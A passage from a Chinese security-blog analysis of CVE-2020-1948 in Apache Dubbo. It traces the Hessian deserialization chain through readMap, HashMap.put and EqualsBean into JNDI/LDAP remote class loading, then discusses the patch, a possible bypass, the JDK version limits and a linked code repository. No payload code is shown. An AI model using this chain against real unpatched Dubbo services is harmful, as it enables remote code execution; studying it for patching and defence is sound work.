<a class="reference-link" name="0x2%20Dubbo%20Hessian%20ReadObject%E5%87%BD%E6%95%B0"></a>0x2 Dubbo Hessian ReadObject函数</h3>
<p>这里是Hessian 反序列化触发链，从Hessian2ObjectInput到Hessian2Input对象</p>
<p><img class="alignnone size-full wp-image-209270 aligncenter" alt="" width="794" height="136" data-original="https://p4.ssl.qhimg.com/t01971525f5f0cdf024.png"></p>
<p><img class="size-full wp-image-209271 aligncenter" alt="" width="800" height="242" data-original="https://p1.ssl.qhimg.com/t0114e69ae49c845dad.jpg"></p>
<h3 name="h3-18" id="h3-18">
<a class="reference-link" name="0x3%20%E8%A7%A6%E5%8F%91readMap%E5%87%BD%E6%95%B0"></a>0x3 触发readMap函数</h3>
<p>在Hessian2Input对象中的readobject方法中调用了readMap函数</p>
<p><img class="alignnone size-full wp-image-209272 aligncenter" alt="" width="800" height="513" data-original="https://p4.ssl.qhimg.com/t0194b874c3bd70c530.jpg"></p>
<p><img class="alignnone size-full wp-image-209273 aligncenter" alt="" width="800" height="412" data-original="https://p0.ssl.qhimg.com/t0147e5e074ed85aff3.jpg"></p>
<p>注意这里的触发条件是 tag == ‘H’，_buffer是请求的二进制协议数据</p>
<p><img class="size-full wp-image-209274 aligncenter" alt="" width="639" height="280" data-original="https://p3.ssl.qhimg.com/t01d7176ccbf9d7b831.png"></p>
<h3 name="h3-19" id="h3-19">
<a class="reference-link" name="0x4%20%E8%A7%A6%E5%8F%91HashMap.put%E5%87%BD%E6%95%B0"></a>0x4 触发HashMap.put函数</h3>
<p>此时的map为HashMap对象，目前来看一切都在设计之内</p>
<p><img class="size-full wp-image-209275 aligncenter" alt="" width="800" height="386" data-original="https://p0.ssl.qhimg.com/t01826878441aa473d0.jpg"></p>
<h3 name="h3-20" id="h3-20">
<a class="reference-link" name="0x5%20%E8%A7%A6%E5%8F%91hashkey.hashCode%E5%87%BD%E6%95%B0"></a>0x5 触发hashkey.hashCode函数</h3>
<p>接着调用了HashMap.hash方法</p>
<p><img class="alignnone size-full wp-image-209276 aligncenter" alt="" width="800" height="101" data-original="https://p0.ssl.qhimg.com/t018cbdeeabaad4632d.jpg"></p>
<p>触发 key.hashCode方法，key为EqualsBean对象</p>
<p><img class="size-full wp-image-209277 aligncenter" alt="" width="603" height="313" data-original="https://p2.ssl.qhimg.com/t0145014cdfa7801116.png"></p>
<h3 name="h3-21" id="h3-21">
<a class="reference-link" name="0x6%20%E8%A7%A6%E5%8F%91EqualsBean.beanHashCode%E5%87%BD%E6%95%B0"></a>0x6 触发EqualsBean.beanHashCode函数</h3>
<p><img class="alignnone size-full wp-image-209278 aligncenter" alt="" width="379" height="365" data-original="https://p0.ssl.qhimg.com/t019d38122b888b514d.png"></p>
<p>随后出发了toStringBean的Tostring方法</p>
<p><img class="size-full wp-image-209279 aligncenter" alt="" width="445" height="401" data-original="https://p0.ssl.qhimg.com/t01985c97795196e708.png"></p>
<p>继续跟入，走到了常见的jndi注入利用链</p>
<h3 name="h3-22" id="h3-22">
<a class="reference-link" name="0x7%20%E8%A7%A6%E5%8F%91JNDI%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E9%93%BE"></a>0x7 触发JNDI注入利用链</h3>
<p>这里利用了toStringBean的Tostring方法中的反射调用</p>
<p><img class="size-full wp-image-209280 aligncenter" alt="" width="694" height="576" data-original="https://p4.ssl.qhimg.com/t01289f8c6578f11c04.png"></p>
<p>这之后就是以前经常利用的JNDI利用链了</p>
<p><img class="alignnone size-full wp-image-209281 aligncenter" alt="" width="651" height="215" data-original="https://p3.ssl.qhimg.com/t01dcbf68ae74eb50cf.png"></p>
<p><img class="alignnone size-full wp-image-209282 aligncenter" alt="" width="800" height="197" data-original="https://p0.ssl.qhimg.com/t0166e7b2c8f5b65ae3.jpg"></p>
<p>通过调试可以很清楚查看ldap参数的传递和使用过程</p>
<p><img class="size-full wp-image-209283 aligncenter" alt="" width="800" height="86" data-original="https://p4.ssl.qhimg.com/t015cf98f49e9c923c5.jpg"></p>
<p>在这之后就是远程类加载和执行了，分析到这应该很清楚payload的调用过程了。</p>
<p> </p>
<h2 name="h2-23" id="h2-23">0x06 漏洞补丁</h2>
<p>从补丁对比上分析，发现在反序列化之前进行了方法Dubbo方法名的判断，具体如下。</p>
<p><img class="alignnone size-full wp-image-209284 aligncenter" alt="" width="800" height="111" data-original="https://p5.ssl.qhimg.com/t015005fc5233228773.jpg"></p>
<p><img class="alignnone size-full wp-image-209285 aligncenter" alt="" width="500" height="92" data-original="https://p5.ssl.qhimg.com/t013361a33f21a6be9f.png"></p>
<p><img class="size-full wp-image-209286 aligncenter" alt="" width="545" height="99" data-original="https://p2.ssl.qhimg.com/t018754600b369d983b.png"></p>
<p>简单的判断method是否为<code>$echo</code> 或者 <code>$invoke</code>等，如果方法名称不对的话，在这一步就会死掉，可以尝试下绕过。】<br>
在高版本JDK中默认TRUST_URL_CODE_BASE为False，且有校验，在jdk8u191以后ldap就不能成功了，低版本的JDK还是可以的。</p>
<p><img class="size-full wp-image-209287 aligncenter" alt="" width="800" height="156" data-original="https://p2.ssl.qhimg.com/t01a8ce6822c3fe7dee.jpg"></p>
<p>文章中代码整理到了github上</p>
<p><a href="https://github.com/ctlyz123/CVE-2020-1948">https://github.com/ctlyz123/CVE-2020-1948</a></p>
<p> </p>
<h2 name="h2-24" id="h2-24">0x07 参考链接</h2>
<p>感谢师傅们的博客，学习到了很多~~</p>
<p>https://www.mail-archive.com/dev@dubbo.apache.org/msg06544.html<br><a href="https://juejin.im/post/5ef2be63f265da02b643218a#heading-6">https://juejin.im/post/5ef2be63f265da02b643218a#heading-6</a><br><a href="https://paper.seebug.org/1131/">https://paper.seebug.org/1131/</a><br><a href="https://www.anquanke.com/post/id/197658#h3-5">https://www.anquanke.com/post/id/197658#h3-5</a></p>
</body>
</html>
                    </div>
                    <section class="article-footer-label">
                        <div>
                                                         <div>
                                本文由安全客原创发布
                                <br>转载，请参考<a href="/note/repost" target="_blank">转载声明</a>，注明出处：
                                <a href="/post/id/209251"
                                   target="_blank">https://www.anquanke.com/post/id/209251</a>
                                <br>安全客 - 有思想的安全新媒体
                            </div>
                                                     </div>
                    </section>
                    <section style="margin-top:18px;">
                                                    <a class="article-tag-primary" href="/tag/漏洞分析" target="_blank">漏洞分析</a>                     </section>
                    <section style="text-align:center;margin-top:40px;" class="hide-in-mobile-device">
                        <button onclick="likePost()" class="btn btn-primary btn-lg btn-like"
                                 style="min-width:100px;">
                            <i class="fa fa-thumbs-o-up" aria-hidden="true" style="margin-right:10px;"></i>
                                                            <span id="like_status">赞</span> <span id="like_count_area"> (
                                    <span
                                            id="like_count">1</span>)</span>
                                                    </button>
                        <button class="btn btn-danger btn-lg btn-favorite" style="min-width:100px;"
                                onclick="favorite();">
                            <i class="fa fa-heart" aria-hidden="true" style="margin-right:10px;"></i>收藏
                        </button>
                    </section>
                    <section class="hide-in-mobile-device"
                             style="text-align:center;margin-top:40px;border-top:1px #f7f7f7 solid;position:relative;line-height:40px;">
                        <div style="float:left;height:80px;line-height:80px;">
                            <a rel="noopener noreferrer" target="_blank" href="/member/149714"
                               style="color:#333333">
                                <div>
                                    <div class="avatar"
                                         style="background-image: url(https://p2.ssl.qhimg.com/sdm/40_40_100/t01be19979eb7c4c2da.png);height:28px;width:28px;margin-top:28px;float:left;"></div>
                                    <div style="float:left;margin-left:5px;">
                                        <nobr>
                                                <span class="">D4ck</span>                                         </nobr>
                                    </div>
                                </div>
                            </a>
                        </div>
                        <div class="bdsharebuttonbox" data-tag="share_1"
                             style="display:table-cell;vertical-align:midlle;float:right;margin-top:20px;">
                            <span style="font-weight: 800;color: #999999;">分享到：</span>
                            <img data-cmd="qzone" alt="QQ空间"
                                 src="https://p0.ssl.qhimg.com/sdm/28_28_100/t014ba42aad7714178d.png"/>
                            <img data-cmd="tsina" alt="新浪微博"
                                 src="https://p0.ssl.qhimg.com/sdm/28_28_100/t01f0d8694dda79069d.png"/>
                            <img data-cmd="weixin" alt="微信"
                                 src="https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png"/>
                            <img data-cmd="sqq" alt="QQ"
                                 src="https://p0.ssl.qhimg.com/sdm/28_28_100/t010d95bee6ba3edf60.png"/>
                            <img data-cmd="fbook" alt="facebook"
                                 src="https://p0.ssl.qhimg.com/sdm/28_28_100/t01a5e75c16cffcb0ba.png"/>
                            <img data-cmd="twi" alt="twitter"
                                 src="https://p0.ssl.qhimg.com/sdm/28_28_100/t01fc30c819f51e9cff.png"/>
                        </div>
                    </section>
                    <div>
                    </div>
                </div>
                <section style="margin-top:20px;" class="hide-in-mobile-device">
                    <div style="font-weight:bolder;position:relative;font-size:18px;">
                        <span style="color:#1dada7;font-weight:900;margin-right:6px;">|</span>推荐阅读
                        <div style="position:absolute;right:18px;top:14px;font-size:14px;">
                        </div>
                    </div>
                    <div class="row">
                                                    <div class="col col-6" style="padding:6px;">
                                <a href="/post/id/209576">
                                    <img src="https://p4.ssl.qhimg.com/sdm/229_160_100/t01af739f5bbfbe58ef.jpg"
                                         class="rounded" style="width:100%;">
                                    <h6 style="margin-top:5px;width:100%;height: 40px;overflow: hidden">Dubbo2.7.7反序列化漏洞绕过分析</h6>
                                    <time style="color:#999999">2020-07-02 11:30:44</time>
                                </a>
                            </div>
                                                    <div class="col col-6" style="padding:6px;">
                                <a href="/post/id/209602">
                                    <img src="https://p4.ssl.qhimg.com/sdm/229_160_100/t01b3ba6d90fbc06430.jpg"
                                         class="rounded" style="width:100%;">
                                    <h6 style="margin-top:5px;width:100%;height: 40px;overflow: hidden">玩转密码学——Cryptopals题解</h6>
                                    <time style="color:#999999">2020-07-02 11:00:14</time>
                                </a>
                            </div>
                                                    <div class="col col-6" style="padding:6px;">
                                <a href="/post/id/209597">
                                    <img src="https://p5.ssl.qhimg.com/sdm/229_160_100/t01afcb7cadf62e4a11.png"
                                         class="rounded" style="width:100%;">
                                    <h6 style="margin-top:5px;width:100%;height: 40px;overflow: hidden">Nexus Repository Manager 2.x 命令注入漏洞 (CVE-2019-5475) 两次绕过</h6>
                                    <time style="color:#999999">2020-07-02 10:30:03</time>
                                </a>
                            </div>
                                                    <div class="col col-6" style="padding:6px;">
                                <a href="/post/id/209332">
                                    <img src="https://p3.ssl.qhimg.com/sdm/229_160_100/t010a00ec7bc3fcf3a9.jpg"
                                         class="rounded" style="width:100%;">
                                    <h6 style="margin-top:5px;width:100%;height: 40px;overflow: hidden">glibc 2.27 FILE Structure Exploitation (_IO_str_overflow)</h6>
                                    <time style="color:#999999">2020-07-02 10:00:00</time>
                                </a>
                            </div>
                                            </div>
                </section>
                <div style="width:100%;" class="comment-area" id="comment">
                    <section style="margin-top:20px;">
                        <div style="font-weight:bolder;position:relative;font-size:18px;">
                            <span style="color:#1dada7;font-weight:900;margin-right:6px;">|</span>发表评论
                        </div>
                        <div class="comment-box">
                            <textarea id="comment-content" placeholder="发表你的评论吧"></textarea>
                            <div class="bottom-area">
                                <div style="float:left;" class="comment-login hide-in-mobile-device">
                                    <div style="float:left;height:28px;line-height:28px;margin-top: 2px;margin-left: 6px;">
                                        <a rel="noopener noreferrer" target="_blank"
                                           href="/member/149714"
                                           style="color:#333333">
                                            <div>
                                                <div class="avatar"
                                                     style="height:28px;width:28px;float:left;"></div>
                                                <div style="float:left;margin-left:5px;">
                                                    <nobr>
                                                        <span class="nickname">
                                                        </span>
                                                    </nobr>
                                                </div>
                                            </div>
                                        </a>
                                    </div>
                                </div>
                                <div style="float:left;" class="comment-not-login hide-in-mobile-device">
                                    <span class="hide-in-mobile-device"
                                          style="color:#666666;margin-right:4px;font-size:12px;">昵称</span>
                                    <input class="hide-in-mobile-device" type="text"
                                           style="border:none;height:30px;background-color:#e9e9e9;font-size:12px;padding-left:8px;color:#666666"
                                           id="comment-nickname" style="" value="教主"></input>
                                    <span class="hide-in-mobile-device"
                                          style="margin-left:12px;color:#999999;font-size:12px;cursor:pointer"
                                          onclick="getRandomNickname(false);">
                                        <i class="fa fa-refresh" aria-hidden="true"
                                           style="margin-right:4px;"></i> 换一个</span>
                                </div>
                                <div style="float:right;">
                                    <button class="btn btn-primary btn-sm" onclick="comment(false);">发表评论</button>
                                </div>
                            </div>
                        </div>
                    </section>
                    <section style="margin-top:40px;">
                        <div style="font-weight:bolder;position:relative;font-size:18px;">
                            <span style="color:#1dada7;font-weight:900;margin-right:6px;">|</span>评论列表
                        </div>
                        <div style="width:100%;line-height:180px;text-align:center;color:#999999;font-size:15px;display:none;"
                             id="comment-empty">
                            还没有评论呢，快去抢个沙发吧~
                        </div>
                        <ul style="padding:0px ;margin-top:20px;" id="comment-list">
                        </ul>
                        <div id="loadButton"
                             style="width:100%;background-color:#e2e2e2;border-radius:4px;text-align:center;padding:7px;margin-top:20px;color:#666666;cursor:pointer;"
                             onclick="loadComment(false);">加载更多
                        </div>
                    </section>
                </div>
            </div>
            <!-- 侧边栏 -->
            <div class="col col-xs-0 col-sm-0 col-md-0 col-lg-6 hide-in-mobile-device">
                <div class="sidebar">
                    <div class="article-detail-user-box box-shadow" style="background-color: white">
                        <div>
                            <div class="row">
                                <div class="col col-24">
                                    <div style="background-image:url('https://p3.ssl.qhimg.com/sdm/290_80_100/t014757b72460d855bf.png');margin-top:-12px;height: 80px;margin-left:-12px;margin-right:-12px;background-position: center;background-size: cover;"></div>
                                    <a rel="noopener noreferrer" target="_blank" href="/member/149714">
                                        <div class="avatar"
                                             style="box-shadow:2px 5px 17px #eee;background-color:white;background-image: url(https://p2.ssl.qhimg.com/sdm/200_200_100/t01be19979eb7c4c2da.png);z-index: 4;margin-top: -40px;"></div>
                                    </a>
                                </div>
                                <div class="col col-24">
                                    <div class="user-info" style="text-align: center;margin-left: 0;">
                                        <a rel="noopener noreferrer" target="_blank"
                                           href="/member/149714">
                                            <div class="name" style="display:table-cell;vertical-align:middle;">
                                                <span style="display:table-cell;vertical-align:middle;"><span
                                                            style="vertical-align:middle;">D4ck</span>
                                                </span>
                                            </div>
                                        </a>
                                        <div class="slogan">这个人太懒了，签名都懒得写一个</div>
                                    </div>
                                </div>
                            </div>
                            <div class="bottom-info">
                                <div class="bottom-info-left">
                                    <div class="info-block">
                                        <div class="key">文章</div>
                                        <div class="value">1</div>
                                    </div>
                                    <div class="info-block">
                                        <div class="key">粉丝</div>
                                        <div class="value">0</div>
                                    </div>
                                </div>
                                <div class="bottom-info-right">
                                    <div class="info-block" style="width: auto; padding: 10px;">
                                        <div>
                                            <button type="button" style="display: none;"
                                                    class="btn btn-outline-primary btn-sm follow-button">
                                                <i class="fa fa-plus" style="margin-right:3px;"></i>
                                                <span>关注</span>
                                            </button>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <h2>TA的文章</h2>
                                                            <div class="post-item">
                                    <div class="title">
                                        <a href="/post/id/209251">CVE-2020-1948 Apache Dubbo Hessian 反序列化漏洞分析</a>
                                    </div>
                                    <div class="date">2020-06-28 16:30:12</div>
                                </div>
                                                    </div>
                    </div>
                    <div class="input-group mb-3" style="margin-top:14px;">
                        <div class="input-group-prepend">
                                <span class="input-group-text" style="background-color:white;color:#1dada7"
                                      id="basic-addon1">
                                    <i class="fa fa-search" aria-hidden="true"></i>
                                </span>
                        </div>
                        <input type="text" class="form-control search-input" placeholder="输入关键字搜索内容" aria-label="search"
                               aria-describedby="basic-addon1">
                    </div>
                    <div class="meta-box">
                        <h3 class="meta-box-title">相关文章</h3>
                        <div style="padding:8px;">
                            <ul class="similar—article-list">
                                                                    <li>
                                        <a href="/post/id/209576" target="_blank" rel="noopener noreferrer">
                                            Dubbo2.7.7反序列化漏洞绕过分析</a>
                                    </li>
                                                                    <li>
                                        <a href="/post/id/209597" target="_blank" rel="noopener noreferrer">
                                            Nexus Repository Manager 2.x 命令注入漏洞 (CVE-2019-5475) 两次绕过</a>
                                    </li>
                                                                    <li>
                                        <a href="/post/id/209445" target="_blank" rel="noopener noreferrer">
                                            CVE-2020-11896  Treck TCP/IP stack漏洞分析</a>
                                    </li>
                                                                    <li>
                                        <a href="/post/id/209217" target="_blank" rel="noopener noreferrer">
                                            NETGEAR R6700v3堆溢出漏洞分析</a>
                                    </li>
                                                                    <li>
                                        <a href="/post/id/209232" target="_blank" rel="noopener noreferrer">
                                            Pwn2Own-Netgear-R6700-UPnP漏洞分析</a>
                                    </li>
                                                                    <li>
                                        <a href="/post/id/209032" target="_blank" rel="noopener noreferrer">
                                            Windows Defender 本地提权漏洞分析（CVE-2020-1170）</a>
                                    </li>
                                                                    <li>
                                        <a href="/post/id/208757" target="_blank" rel="noopener noreferrer">
                                            CVE-2020-13162：Pulse Secure Windows客户端TOCTOU权限提升漏洞</a>
                                    </li>
                                                            </ul>
                        </div>
                    </div>
                    <div class="card hot-recommand">
                        <div class="card-header">
                            热门推荐
                        </div>
                        <div class="card-body">
                            <div class="home-block-info">
                                <a rel="noopener noreferrer" href="/post/id/162175" target="_blank">
                                    <div class="block-info-item"
                                         style="margin-left: 0px; height: 195px; margin-top: 0px; background:url(https://p4.ssl.qhimg.com/t0103c09221eaa4f35b.png) repeat scroll center center / cover; overflow: hidden; width: 100%;">
                                        <div class="block-info-item-bg"
                                             style="width: 100%;background-color:transparent;">
                                                                                    </div>
                                    </div>
                                </a>
                            </div>
                        </div>
                    </div>
                                            <div class="article-index">
                            <h5>文章目录</h5>
                            <nav id="article-index" class="navbar navbar-light">
                                <nav class="nav nav-pills ">
                                                                            <a class="nav-link" href="#h2-0">0x00 背景</a>                                          <a class="nav-link" href="#h2-1">0x1 影响范围</a>                                          <a class="nav-link" href="#h2-2">0x02 协议介绍</a>                                             <nav class="nav nav-pills sub-index">
                                                                                                    <a class="nav-link"
                                                       href="#h3-3">0x1 dubbo</a>                                                     <a class="nav-link"
                                                       href="#h3-4">0x2 Hessian</a>                                                     <a class="nav-link"
                                                       href="#h3-5">0x3 协议关系</a>                                             </nav>
                                                                                 <a class="nav-link" href="#h2-6">0x03 环境搭建</a>                                             <nav class="nav nav-pills sub-index">
                                                                                                    <a class="nav-link"
                                                       href="#h3-7">0x1 搭建dubbo-spring-boot</a>                                                     <a class="nav-link"
                                                       href="#h3-8">0x2 添加漏洞利用链</a>                                             </nav>
                                                                                 <a class="nav-link" href="#h2-9">0x04 漏洞原理与利用</a>                                             <nav class="nav nav-pills sub-index">
                                                                                                    <a class="nav-link"
                                                       href="#h3-10">0x1 原理</a>                                                     <a class="nav-link"
                                                       href="#h3-11">0x2 利用链分析</a>                                                     <a class="nav-link"
                                                       href="#h3-12">0x3 构造Payload</a>                                                     <a class="nav-link"
                                                       href="#h3-13">0x4 开启LDAP服务</a>                                                     <a class="nav-link"
                                                       href="#h3-14">0x5 编写python攻击脚本</a>                                             </nav>
                                                                                 <a class="nav-link" href="#h2-15">0x05 漏洞调试</a>                                             <nav class="nav nav-pills sub-index">
                                                                                                    <a class="nav-link"
                                                       href="#h3-16">0x1 反序列化入口</a>                                                     <a class="nav-link"
                                                       href="#h3-17">0x2 Dubbo Hessian ReadObject函数</a>                                                     <a class="nav-link"
                                                       href="#h3-18">0x3 触发readMap函数</a>                                                     <a class="nav-link"
                                                       href="#h3-19">0x4 触发HashMap.put函数</a>                                                     <a class="nav-link"
                                                       href="#h3-20">0x5 触发hashkey.hashCode函数</a>                                                     <a class="nav-link"
                                                       href="#h3-21">0x6 触发EqualsBean.beanHashCode函数</a>                                                     <a class="nav-link"
                                                       href="#h3-22">0x7 触发JNDI注入利用链</a>                                             </nav>
                                                                                 <a class="nav-link" href="#h2-23">0x06 漏洞补丁</a>                                          <a class="nav-link" href="#h2-24">0x07 参考链接</a>                                  </nav>
                            </nav>
                        </div>
                                    </div>
            </div>
        </div>
    </div>
    <link href="https://lib.baomitu.com/highlight.js/9.12.0/styles/github.min.css" rel="stylesheet">
<script src="https://lib.baomitu.com/highlight.js/9.12.0/highlight.min.js"></script>    <script>
        $(function () {
            $("img").lazyload({
                effect: "fadeIn"
            });
            $(".lazy").lazyload({
                effect: "fadeIn"
            });
        });
        $(".article-index").sticky({
            topSpacing: 60
        });
        hljs.initHighlighting();
    </script>
</main>
<script>
    $(document).ready(function () {
        $(".article-index").mCustomScrollbar({
            theme: "minimal-dark"
        });
        loadComment(true);
        getRandomNickname(false);
        var desc = "https://p3.ssl.qhimg.com/t0164d67734a841c580.jpg";
        window._bd_share_config = {
            share: [{
                bdText: "CVE-2020-1948 Apache Dubbo Hessian 反序列化漏洞分析",
                bdDesc: desc.replace(/[&\|\\\*^%$#@\-]/g, ""),
                bdUrl: window.location.href,
                bdPic: "https://p3.ssl.qhimg.com/t0164d67734a841c580.jpg",
                tag: "share_1"
            }]
        };
        with (document) 0[(getElementsByTagName('head')[0] || body).appendChild(createElement(
            'script')).src =
            'https://static.anquanke.com/bdshare/static/api/js/share.js?cdnversion=' + ~(-new Date() /
            36e5)];
    });
    $(window).scroll(function () {
        var top1 = $('#comment-list').offset().top;
        var gun = $(document).scrollTop();
        var top = top1 - gun;
        if (top <= 700) {
            $('.article-index').fadeOut();
        } else {
            $('.article-index').fadeIn();
        }
    });
    var post_id = "209251"; //文章id
    var user_id = "149714"; //作者用户id

    var post_favorite = false;
    var next = "";
    var comments = [];
    axios.get(api("user/favorite?target_post_id=" + post_id)).then(function (res) {
        if (res.data.success) {
            swtichFavorite(res.data.data.favorite);
            post_favorite = res.data.data.favorite;
        }
    });

    function swtichFavorite(favorite) {
        if (favorite) {
            $(".btn-favorite").html('<i class="fa fa-heart" aria-hidden="true" style="margin-right:10px;"></i>已收藏');
        }
        else {
            $(".btn-favorite").html('<i class="fa fa-heart" aria-hidden="true" style="margin-right:10px;"></i>收藏');
        }
    }

    function favorite() {
        if (getLocalUserInfo().isLogin) {
            post_favorite = !post_favorite;
            swtichFavorite(post_favorite);
            axios.post(api("user/favorite"), {"id": post_id}).then(function (res) {
            });
        }
        else {
            window.location.href = "/login";
        }
    }
    function removeSpecialChar(s) {
        if(!s)s="";
        return s.replace("'","").replace("<","").replace(">","").replace("(","").replace(")","").replace("&","").replace(":","").replace("\'","").replace("\"","").replace("=","").replace(".","").replace(";","");
    }

    function loadComment(refresh) {
        var request_url = "";
        if (refresh) {
            $("#comment-list").empty();
        }
        if (next) request_url = next;
        else request_url = api("comment?top=true&size=30&page=1&post_id=" + post_id);
        axios.get(request_url).then(function (res) {
            var normal_comment_template_source = $("#normal-comment").html();
            var normal_comment_template = Handlebars.compile(normal_comment_template_source);
            if (res.data.data && res.data.data.length > 0) {
                res.data.data.forEach(function (e) {
                    var html = "";
                    if(e.user)
                    {
                        e.user.nickname=removeSpecialChar(e.user.nickname);
                    }

                    if(e.nickname)
                    {
                        e.nickname=removeSpecialChar(e.nickname);
                    }

                    html = normal_comment_template(e);
                    $("#comment-list").append(html);
                });
                next = res.data.next;
                $("#comment-empty").hide();
            }
            else {
                $("#comment-empty").show();
                $("#loadButton").hide();
            }

            if ((!res.data.data) || res.data.data.length < 30) $("#loadButton").hide();
            else $("#loadButton").show();
        });
    }

    Handlebars.registerHelper('subcomments', function (value) {
        var html = "";
        $.each(value, function (i, item) {
            var sub_comment_template_source = $("#normal-comment").html();
            var sub_comment_template = Handlebars.compile(sub_comment_template_source);
            html += sub_comment_template(item);
        });
        return new Handlebars.SafeString(html);
    });
    Handlebars.registerHelper('if_author', function (value, opts) {
        if (value == user_id)
            return opts.fn(this);
        else
            return opts.inverse(this);
    });

    function replyBox(comment_id, nickname) {
        var reply_box_template_source = $("#reply-box").html();
        var reply_box_template = Handlebars.compile(reply_box_template_source);
        var currentLoginUser = getLocalUserInfo();
        var html = reply_box_template({
            comment_id: comment_id,
            nickname: nickname,
            currentLoginUser: currentLoginUser
        });
        $(".reply-box").empty();
        $("#reply-box-" + comment_id).append(html);
        getRandomNickname(comment_id);
    }

    function comment(comment_id) {
        if (post_id) {
            var data = {};
            if (comment_id)
                data.content = $("#comment-content-" + comment_id).val();
            else
                data.content = $("#comment-content").val();
            data.post_id = post_id;
            if (comment_id)
                data.parent = comment_id;
            if (comment_id)
                data.nickname = $("#comment-nickname-" + comment_id).val();
            else
                data.nickname = $("#comment-nickname").val();
            if (getLocalUserInfo().isLogin)
                data.nonce = getLocalUserInfo().user.nonce;
            axios.post(api("comment"), data)
                .then(function (response) {
                    if (response.data.success) {
                        $("#comment-empty").hide();
                        $(".reply-box").empty();
                        appendComment(comment_id, response.data.comment);
                        if (!comment_id)
                            $("#comment-content").val("");
                    } else {
                    }
                })
                .catch(function (error) {
                });
        }
    }

    function appendComment(comment_id, comment) {
        var comment_template_source = $("#normal-comment").html();
        var comment_template = Handlebars.compile(comment_template_source);
        var html = comment_template(comment);
        if (comment_id) {
            $("#comment-child-" + comment_id).prepend(html);
            $("#comment-child-" + comment_id).css("display", "block");
        } else {
            $("#comment-list").prepend(html);
        }
    }

    function likePost() {
        axios.post(api("post/like"), {"id": post_id}).then(function (res) {

        });
        $("#like_status").text("已赞");
        $(".btn-like").attr("disabled", "disabled");
        $("#like_count_area").text("(" + (parseInt($("#like_count").text().length == 0 ? 0 : ($("#like_count").text())) + 1) + ")");
    }

    function like(comment_id) {
        if (!$("#comment-like-button-" + comment_id).hasClass("liked")) {
            $("#comment-like-button-" + comment_id).addClass("liked");
            var count = $("#comment-like-count-" + comment_id).text();
            $("#comment-like-count-" + comment_id).text((count.length == 0 ? 0 : parseInt(count)) + 1);
            axios.post(api("comment/like"), {
                comment_id: comment_id,
                post_id: post_id
            })
                .then(function (response) {
                    if (response.data.success) {
                    } else {
                    }
                })
                .catch(function (error) {
                });
        }
    }

    function getRandomNickname(comment_id) {
        let nicknames = ['Helen', 'Anonymous', '教主', '妇科圣手', '男科圣手', '大表姐', '大表哥', '带头大哥', '白帽子', '黑帽子', '越南邻国宰相',
            '我不是黑客', '你全家都是黑客', '匿名用户', '管理员', '吃瓜群众', '小虎', '熊猫烧香作者', 'Ping溢出大神', 'Dir溢出大神', '神奇小子',
            '土司观光团', '网瘾患者', '杨教授'
        ];
        var nickname = nicknames[random(0, nicknames.length - 1)];
        if (comment_id)
            $("#comment-nickname-" + comment_id).val(nickname);
        else
            $("#comment-nickname").val(nickname);
        return nickname;
    }

    isFollow(149714);

</script>

    <script type="text/template" id="reply-box">
        <div class="comment-box">
            <textarea placeholder="回复 @{{nickname}} 的评论" id="comment-content-{{comment_id}}"></textarea>
            <div class="bottom-area">
                {{#if currentLoginUser.isLogin}}
                <div style="float:left;" class="hide-in-mobile-device">
                    <div style="float:left;height:28px;line-height:28px;margin-top: 2px;margin-left: 6px;">
                        <a rel="noopener noreferrer" target="_blank"
                           href="/member/{{currentLoginUser.user.id}}"
                           style="color:#333333">
                            <div>
                                <div class="avatar"
                                     style="height:28px;width:28px;float:left;background-image:url({{currentLoginUser.user.avatar}});"></div>
                                <div style="float:left;margin-left:5px;">
                                    <nobr><span class="nickname">{{currentLoginUser.user.nickname}}</span></nobr>
                                </div>
                            </div>
                        </a>
                    </div>
                </div>
                {{else}}
                <div style="float:left;" class="hide-in-mobile-device">
                    <span style="color:#666666;margin-right:4px;font-size:12px;">昵称</span>
                    <input type="text"
                           style="border:none;height:30px;background-color:#e9e9e9;font-size:12px;padding-left:8px;color:#666666"
                           id="comment-nickname-{{comment_id}}" style="" value="教主"></input>
                    <span style="margin-left:12px;color:#999999;font-size:12px;cursor:pointer"
                          onclick="getRandomNickname({{comment_id}});">
                        <i class="fa fa-refresh" aria-hidden="true" style="margin-right:4px;"></i> 换一个</span>
                </div>
                {{/if}}
                <div style="float:right;">
                    <button class="btn btn-secondary btn-sm" onclick="$('#reply-box-{{comment_id}}').empty();">取消
                    </button>
                    <button class="btn btn-primary btn-sm" onclick="comment({{comment_id}});">发表评论</button>
                </div>
            </div>
        </div>
    </script>
    <script type="text/template" id="normal-comment">
        <li id="comment-item-{{id}}" class="comment-item {{#if parent}}subcomment{{/if}}">
            {{#if user}}
            <a href="/member/{{user.id}}" target="_blank">
            <span class="img"
                  style="background: rgba(0, 0, 0, 0) url({{crop_img user.avatar 120 120}}) no-repeat scroll 50% 50% / cover;"></span>
            </a> {{else}}
            <span class="img"
                  style="background: rgba(0, 0, 0, 0) url({{crop_img avatar 120 120}}) no-repeat scroll 50% 50% / cover;"></span> {{/if}}
            <div class="comment-item-body">
                <div class="user-info">
                    {{#if user}}
                    <a href="/member/{{user.id}}" target="_blank">
                        <span class="name {{#if_eq user.user_label 'official'}}official{{/if_eq}} {{#if_eq user.user_label 'verify'}}verify{{/if_eq}} {{#if_eq user.user_label 'src'}}src{{/if_eq}}">{{user.nickname}}</span>
                        {{#if_eq user.user_label 'official'}}
                        <img style="width:15px;height:15px;"
                             src="https://p0.ssl.qhimg.com/sdm/45_45_100/t0122a13a311ae4f7aa.png"/>
                        {{/if_eq}} {{#if_eq user.user_label 'verify'}}
                        <img style="width:15px;height:15px;"
                             src="https://p0.ssl.qhimg.com/sdm/45_45_100/t01d1216d1bce6e01cc.png"/>
                        {{/if_eq}} {{#if_eq user.user_label 'src'}}
                        <img style="width:15px;height:15px;"
                             src="https://p0.ssl.qhimg.com/sdm/45_45_100/t014a6321f3bec70c9f.png"/>
                        {{/if_eq}} {{#if_eq user.user_label 'company'}}
                        <img style="width:15px;height:15px;"
                             src="https://p0.ssl.qhimg.com/sdm/45_45_100/t015467210beb9efcab.png"/>
                        {{/if_eq}}
                    </a> {{else}}
                    <span class="name" style="color:#999999">{{nickname}}</span> {{/if}} {{#if_author user.id}}
                    <span class="time" style="color:#CC0033;font-weight:bold;vertical-align: middle">
                        &nbsp;·&nbsp; 本文作者
                    </span> {{/if_author}}
                    <span class="time" style="vertical-align: middle">
                        &nbsp;·&nbsp; {{date}}
                    </span>
                    <div class="user-info-right">
